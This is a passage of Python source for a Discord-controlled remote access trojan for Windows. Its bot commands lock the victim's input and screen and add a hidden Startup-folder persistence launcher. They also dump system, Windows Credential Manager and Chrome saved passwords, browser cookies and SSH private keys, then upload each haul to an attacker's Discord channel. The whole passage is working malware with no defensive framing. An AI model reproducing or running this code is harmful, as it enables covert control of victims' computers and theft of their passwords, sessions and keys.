            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!displayon":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content.startswith("!website"):
            website = message.content[9:]
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!getsystemcreds":
            generator_expression = run.run_lazagne()
            creds = io.StringIO()
            for expression in generator_expression:
                creds.write(str(expression) + '\n')
            temp = os.getenv("TEMP")
            file_keys = temp + r"\creds.txt"
            with open(file_keys, 'w') as f:
                json.dump(creds.getvalue(), f, indent=4)
            file = discord.File(file_keys, filename="creds.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(file_keys)
        if message.content == "!startup":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
                    e = r"""
                        Set objShell = WScript.CreateObject("WScript.Shell")
                        objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
                        """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                await message.channel.send("[*] Command successfuly executed")  
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!dumpcookies":
            cj = browser_cookie3.load()
            temp = os.getenv("TEMP")
            file_keys = temp + r"\cookies.txt"
            with open(file_keys, 'w') as f:
                json.dump(requests.utils.dict_from_cookiejar(cj), f)
            file = discord.File(file_keys, filename="cookies.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(file_keys)
        if message.content == "!dumpwindowscreds":
            CredEnumerate = win32cred.CredEnumerate
            CredRead = win32cred.CredRead
            try:
                creds = CredEnumerate(None, 0)
            except Exception:
                pass
            credentials = []
            for package in creds:
                try:
                    target = package['TargetName']
                    creds = CredRead(target, CRED_TYPE_GENERIC)
                    credentials.append(creds)
                except pywintypes.error:
                    pass
            credman_creds = io.StringIO()
            for cred in credentials:
                service = cred['TargetName']
                username = cred['UserName']
                try:
                    password = cred['CredentialBlob'].decode('utf-16')
                except UnicodeDecodeError:
                    try:
                        password = cred['CredentialBlob'].decode('utf-8')
                    except UnicodeDecodeError:
                        password =  cred['CredentialBlob']
                credman_creds.write('Service: ' + str(service) + '\n')
                credman_creds.write('Username: ' + str(username) + '\n')
                credman_creds.write('Password: ' + str(password) + '\n')
                credman_creds.write('\n')
            temp = os.getenv("TEMP")
            file_keys = temp + r"\windows-creds.txt"
            with open(file_keys, 'w') as f:
                json.dump(credman_creds.getvalue(), f)
            file = discord.File(file_keys, filename="windows-creds.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(file_keys)
        if message.content == "!dumpchromecreds":
            try:
                login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
                shutil.copy2(login_data, './Login Data')
                win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN)
            except Exception:
                pass
            chrome_credentials = io.StringIO()
            try:
                conn = sqlite3.connect('./Login Data', )
                cursor = conn.cursor()
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                results = cursor.fetchall()
                conn.close()
                os.remove('Login Data')
                for action_url, username_value, password_value in results:
                    print(password_value)
                    password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1]
                    if password:
                        chrome_credentials.write('URL: ' + action_url + '\n')
                        chrome_credentials.write('Username: ' + username_value + '\n')
                        chrome_credentials.write('Password: ' + str(password) + '\n')
                        chrome_credentials.write('\n')
                temp = os.getenv("TEMP")
                file_keys = temp + r"\chrome-creds.txt"
                with open(file_keys, 'w') as f:
                    json.dump(chrome_credentials.getvalue(), f)
                file = discord.File(file_keys, filename="chrome-creds.txt")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.remove(file_keys)
            except sqlite3.OperationalError as e:
                print(e)
                pass
            except Exception as e:
                print(e)
                pass
        if message.content == "!getsshkeys":
            key = ''
            path = "~/.ssh/"
            temp = os.getenv("TEMP")
            obj = os.scandir(os.path.expanduser(path))
            if (obj):
                for entry in obj :
                    if entry.is_file():
                        with open(entry, 'r') as ssh:
                            key += ' ' + ssh.read().rstrip()
                file_keys = temp + r"\ssh-keys.txt"
                with open(file_keys, 'w') as f:
                    json.dump(key, f)
                file = discord.File(file_keys, filename="chrome-creds.txt")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.remove(file_keys)
            else:
                await message.channel.send("No SSH keys found")

client.run(token)